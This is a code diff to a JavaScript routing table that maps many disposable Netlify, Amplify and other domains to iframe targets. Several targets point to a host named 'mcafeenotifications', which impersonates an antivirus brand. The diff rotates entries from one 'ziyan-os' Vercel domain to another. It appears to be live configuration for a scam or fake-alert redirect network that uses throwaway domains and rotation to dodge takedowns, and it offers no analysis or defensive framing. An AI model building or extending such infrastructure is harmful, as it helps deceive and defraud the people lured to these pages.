@@ -86,18 +86,18 @@ async function getRotationTarget(key) {
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "elegant-truffle-a0f9f7.netlify.app", redisKey: "rotation:target_url" },
-    "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
+    "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://ziyan-os2.vercel.app" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
-    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
+    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://ziyan-os2.vercel.app" },
     "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
     // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://ziyan-os2.vercel.app" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os2.vercel.app" },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
